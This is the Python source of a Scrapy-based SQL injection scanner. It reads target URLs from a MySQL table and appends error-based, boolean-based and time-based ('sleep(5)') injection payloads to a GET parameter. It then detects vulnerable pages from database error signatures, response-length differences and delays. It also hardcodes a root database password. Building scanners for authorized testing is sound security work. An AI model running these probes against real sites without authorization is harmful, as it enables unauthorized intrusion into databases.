#--Created by WD
#python 3.6
#coding:utf-8

from scrapy import *
from pymysql import *
import re
import random
from scrapy.conf import settings
from scrapy.http import Response
import datetime
import requests

#SQL error parttern
SQLI_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"Warning.*PostgreSQL"),
    "Microsoft SQL Server": (r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*odbc_.*", r"Warning.*mssql_", r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark after the character string", r"Microsoft OLE DB Provider for ODBC Drivers"),
    "Microsoft Access": (r"Microsoft Access Driver", r"Access Database Engine", r"Microsoft JET Database Engine", r".*Syntax error.*query expression"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Warning.*oci_.*", "Microsoft OLE DB Provider for Oracle"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error"),
    "SQLite": (r"SQLite/JDBCDriver", r"System.Data.SQLite.SQLiteException"),
    "Informix": (r"Warning.*ibase_.*", r"com.informix.jdbc"),
    "Sybase": (r"Warning.*sybase.*", r"Sybase message")
}

#引起报错注入的一些符号
SQLI_ERROR_PAYLOADS = [
    #"'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', 单引号，两个单引号，"%'",反撇号,'\'
    "'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C"
]
#布尔注入的逻辑符号
SQLI_BOOLEAN_PAYLOADS = [
    "and", "And", "anD", "AND", "aNd", "or", "oR", "OR"
]



class SqliSpider(Spider):
    '''针对每个页面做出SQL注入探测特征码请求，然后根据响应包进行响应包特征码的探测'''

    name = "SqliSpider"


    def __init__(self):
        self.linkth = 1
        # 将得到的Connection对象和Cursor对象分别赋值给self.db_conn和self.db_cur，以便之后使用。
        db_conn = connect(host='localhost', port=3306, db='webscanner', user='root', passwd='toor', charset='utf8')
        self.db_cur = db_conn.cursor()
        self.level = 1
        self.detect_code = None

        # self.url = self.url_space_replace(self.start_urls[0])

    def start_requests(self):
        '''重写starturl的请求'''
        #开始url
        self.start_urls = []
        self.url = self.geturlfrommysql(self.linkth)
        self.url = self.sqli_detect()
        self.start_urls.append(self.url)
        #设置cookie便于访问登录后的页面
        self.cookie = settings['COOKIES']
        yield Request(self.start_urls[0], callback=self.parse, cookies=self.cookie)



    def parse(self, response):
        '''处理请求数据并继续下条url'''

        #是否存在可测试的参数
        if self.detect_code:
            if self.level == 1:
                list = self.sqli_error_check(response.body)
                if list[0]:
                    print(r'存在sqli漏洞:报错注入,数据库：', list[1])
                    self.linkth = self.linkth + 1
                    self.level = 1
                else:
                    self.level = 2.1
            if self.level == 2.1:
                htmllist = self.boolean_getdetect()
                if self.sqli_boolean_check(htmllist[0], htmllist[1]):
                    self.linkth = self.linkth + 1
                    print(r'存在sqli漏洞：布尔注入！')
                    self.level = 1
                else:
                    self.level = 2.2#2.2
                    htmllist = self.boolean_getdetect()
                    if self.sqli_boolean_check(htmllist[0], htmllist[1]):
                        self.linkth = self.linkth + 1
                        print(r'存在sqli漏洞：字符型布尔注入！')
                        self.level = 1
                    else:
                        self.level = 2.3#2.3
                        htmllist = self.boolean_getdetect()
                        if self.sqli_boolean_check(htmllist[0], htmllist[1]):
                            self.linkth = self.linkth + 1
                            print(r'存在sqli漏洞：搜索型布尔注入！')
                            self.level = 1
                        else:
                            self.level = 2.4
                    if self.level == 2.4:
                        self.level = 3
            if self.level == 3:
                self.url = self.geturlfrommysql(self.linkth)
                url = self.sqli_detect()
                starttime = datetime.datetime.now()
                requests.get(url, cookies=self.cookie)
                endtime = datetime.datetime.now()
                if self.sqli_time_check((endtime - starttime).seconds):
                    self.linkth = self.linkth + 1
                    print(r'存在sqli漏洞：基于时间的盲注！')
                    self.level = 1
                else:
                    self.level = 1
                    print(r'不存在sqli漏洞!')
                    self.linkth = self.linkth + 1
        else:
            print(r'不存在sqli漏洞')
            self.linkth = self.linkth + 1

        self.url = self.geturlfrommysql(self.linkth)

        if self.url:
            self.url = self.sqli_detect()
            print("正在测试第%d个url"%self.linkth)
            # 如果找到下一页的URL，构造新的Request 对象
            yield Request(self.url, callback=self.parse, cookies = self.cookie)

    def boolean_getdetect(self):
        self.url = self.geturlfrommysql(self.linkth)
        url = self.sqli_detect()
        truehtml = requests.get(url[0], cookies=self.cookie).text
        falsehtml = requests.get(url[1], cookies=self.cookie).text
        return truehtml,falsehtml




    def sqli_detect(self):
        '''进行GET、POST、COOKIE、Referer探测请求。匹配GET请求的参数和值，并返回构造后测试的请求
        在值的后面添加探测特征码；POST、COOKIE同理'''

        url = self.url
        #获取url中的参数和值
        list = []
        #用正则表达式匹配参数和值，并将每对参数和值添加到{parameter:value}的列表中
        for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w]+)=)(?P<value>[^&]+)", url):
            list.append({'parameter':match.group('parameter'),'value':match.group('value')})

        if len(list) >=1:
            # 获取随机数，达到随机获取其中一个参数进行测试
            # parameter_num = random.randint(0, len(list)-1)
            parameter_num = random.randint(0, 0)
            parameter = list[parameter_num]['parameter']
            value = list[parameter_num]['value']
            #替换前字符串
            oldstr = parameter + '=' + value
            generate_func = ''
            print("Scanning %s for sqli in parameter '%s'" % (url, parameter))
            #根据level等级生成探测码
            if self.level == 1:
                generate_func = 'self.generate_detectcode_error'
            elif self.level == 2.1:
                generate_func = 'self.generate_detectcode_boolean_number'
                dic = {}
            elif self.level == 2.2:
                generate_func = 'self.generate_detectcode_boolean_string'
                dic = {}
            elif self.level == 2.3:
                generate_func = 'self.generate_detectcode_boolean_search'
                dic = {}
            elif self.level == 3:
                generate_func = 'self.generate_detectcode_time'

            if 'dic' in locals().keys():
                list = eval(generate_func)()
                self.detect_code = list['TRUE']
                value1 = value + list['TRUE']
                # 参数和探测值生成新的字符串
                newstr = parameter + '=' + value1
                # 将url替换成探测url
                url_true = url.replace(oldstr, newstr)
                value2 = value + list['FALSE']
                newstr = parameter + '=' + value2
                # 将url替换成探测url
                url_false = url.replace(oldstr, newstr)
                return url_true,url_false
            else:
                self.detect_code = eval(generate_func)()
                value = value + self.detect_code
                #参数和探测值生成新的字符串
                newstr = parameter + '=' + value
                #将url替换成探测url
                url = url.replace(oldstr, newstr)
        else:
            self.detect_code = None

        return url

    def sqli_error_check(self, body):
        """检测响应包中是否含有报错特征码"""
        body = str(body)
        for db, errors in SQLI_ERRORS.items():
            for error in errors:
                if re.compile(error).search(body):
                    # print "\n" + db
                    return True, db
        return False, None

    def sqli_boolean_check(self, response_true, response_false):
        '''检测是否存在布尔注入，通过比较两次响应包'''
        length_true = len(response_true)
        length_false = len(response_false)
        if abs(length_false - length_true) > 50:
            return True
        else:
            return False

    def sqli_time_check(self, time):
        '''检测时间盲注，时间超过5秒说明响应成功'''
        if time > 5 :
            return  True
        else:
            return False

    def insert_vulninfo(self):
        '''向mysql插入漏洞url的原始请求、响应和测试请求、响应'''


    def url_space_replace(self):
        '''替换url/postdata的空格为：%20'''
        surl = ""
        for i in range(len(self.url)):
            # find方法从0开始检测字符串中是否包含子字符串 '?'并返回？的位置
            if i > self.url.find('?'):
                # 将URL的问号后面的所有空格改为URL编码%20
                surl += surl.join(self.url[i]).replace(' ', "%20")
            else:
                surl += surl.join(self.url[i])

        return surl


    def get_detect(self):
        '''GET请求探测'''


    def post_detect(self):
        '''POST请求探测'''

    def cookie_detect(self):
        '''COOKIE数据探测'''

    def referer_detect(self):
        '''referer数据探测'''


    def geturlfrommysql(self, linkth):
        '''从数据库获取要检测的url'''
        sql = 'select link from t_link_tmp where id=%s'
        self.db_cur.execute(sql, linkth)
        try:
            nextlink = self.db_cur.fetchone()[0]
        except:
            nextlink = None
        return nextlink


    def generate_detectcode_error(self):
        '''生成探测码为报错注入码'''
        # 在SQLI_ERROR_PAYLOADS列表中随机取一个
        i = random.randint(0, len(SQLI_ERROR_PAYLOADS) - 1)
        detect_code = SQLI_ERROR_PAYLOADS[i]
        return detect_code


    def generate_detectcode_boolean_number(self):
        '''生成探测码为布尔型：注入点为数字型'''
        # 在SQLI_BOOLEAN_PAYLOADS列表中随机取一个
        i = random.randint(0, len(SQLI_BOOLEAN_PAYLOADS) - 1)
        num = random.randint(1, 99)
        num1 = str(num)
        num2 =str(num-1)
        detect_code = {}
        #数字型注入
        detect_code.update({"TRUE":'%20' + SQLI_BOOLEAN_PAYLOADS[i] + '%20' + num1 + '%3D' + num1})
        detect_code.update({'FALSE':'%20' + SQLI_BOOLEAN_PAYLOADS[i] + '%20' + num1 + '%3D' + num2})
        return detect_code

    def generate_detectcode_boolean_string(self):
        '''生成探测码为布尔型：注入点为字符型'''
        # 在SQLI_BOOLEAN_PAYLOADS列表中随机取一个
        i = random.randint(0, len(SQLI_BOOLEAN_PAYLOADS) - 1)
        num = random.randint(1, 99)
        num1 = str(num)
        num2 =str(num-1)
        detect_code = {}
        #字符型注入
        detect_code.update({"TRUE":"%27%20" + SQLI_BOOLEAN_PAYLOADS[i] + "%20%27" + num1 + "%27" + '%3D' + "%27" + num1})
        detect_code.update({"FALSE":"%27%20" + SQLI_BOOLEAN_PAYLOADS[i] + "%20%27" + num1 + "%27" + '%3D' + "%27" + num2})
        return detect_code

    def generate_detectcode_boolean_search(self):
        '''生成探测码为布尔型:注入点为搜索型'''
        # 在SQLI_BOOLEAN_PAYLOADS列表中随机取一个
        i = random.randint(0, len(SQLI_BOOLEAN_PAYLOADS) - 1)
        detect_code = {}
        #搜索型注入
        detect_code.update({"TRUE":'%20' + SQLI_BOOLEAN_PAYLOADS[i] + "%27%1%%27%3d%27%1%"})
        detect_code.update({"FALSE":'%20' + SQLI_BOOLEAN_PAYLOADS[i] + "%27%1%%27%3d%27%2%"})
        return detect_code

    def generate_detectcode_time(self):
        '''生成探测码为基于时间的盲注探测码'''
        #and 2=sleep(5)
        detect_code = "%20and%202%3Dsleep(5)"
        return detect_code